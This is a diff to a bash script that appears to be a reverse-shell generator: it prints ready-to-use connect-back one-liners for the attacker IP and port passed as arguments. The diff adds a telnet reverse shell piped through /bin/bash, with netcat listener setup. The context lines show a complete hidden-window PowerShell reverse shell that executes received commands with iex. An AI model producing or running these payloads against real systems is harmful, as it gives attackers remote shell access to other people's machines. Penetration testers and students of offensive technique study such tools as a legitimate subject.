@@ -42,7 +42,7 @@ function prompt(){
 
 function reverse_shell_list(){
 
-	echo -e """
+    echo -e """
 [${Blue}1${Color_Off}]Bash		 [${IRed}2${Color_Off}]Ruby
 
 [${Green}3${Color_Off}]Perl		 [${Cyan}4${Color_Off}]Netcat
@@ -53,25 +53,28 @@ function reverse_shell_list(){
 
 [${Cyan}9${Color_Off}]Lua           [${Blue}10${Color_Off}]Powershell
 
+[${Green}11${Color_Off}]Telnet
+
 	"""
-	while true;do
+    while true;do
         prompt
 	read shell_type
 
-	    case $shell_type in
-		1) bash_shell;;
-		2) ruby_shell;;
-		3) perl_shell;;
-		4) netcat_shell;;
-		5) python_shell;;
-	  	6) java_shell;;
-		7) php_shell;;
-	    	8) shellshock;;
-	    	9) lua_shell;;
-		10) powershell;;
-                "exit"|"q"|"quit") exit 0;;
-		*)echo -e "[-]Enter the shell number";reverse_shell_list;;
-	    esac
+	case $shell_type in
+	    1) bash_shell;;
+	    2) ruby_shell;;
+	    3) perl_shell;;
+	    4) netcat_shell;;
+	    5) python_shell;;
+	    6) java_shell;;
+	    7) php_shell;;
+	    8) shellshock;;
+	    9) lua_shell;;
+	   10) powershell;;
+           11) telnet;;
+	   "exit"|"q"|"quit") exit 0;;
+	   *)echo -e "[-]Enter the shell number";reverse_shell_list;;
+	esac
     done
 }
 
@@ -144,6 +147,15 @@ function powershell(){
     echo -e "${pos}${Yellow}Powershell:${Color_Off} powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"${Red}$ipaddr${Color_Off}\",${Red}$port${Color_Off});\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + \"PS \" + (pwd).Path + \"> \";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
 
 }
+
+function telnet(){
+
+    echo -e "${pos}${Yellow}Telnet Reverse Shell:${Color_Off} telnet ${Red}$ipaddr $port${Color_Off} | /bin/bash | telnet ${Red}$ipaddr 9999${Color_Off}"
+    echo -e "[${Red}*${Color_Off}]Set two listeners:
+   [${Red}Input${Color_Off}]  nc -lnvvp ${Red}$port${Color_Off}
+   [${Green}Output${Color_Off}] nc -lnvvp ${Red}9999${Color_Off}"
+}
+
 ipaddr=$1
 port=$2
 if [[ -z $1 ]] && [[ -z $2 ]];then
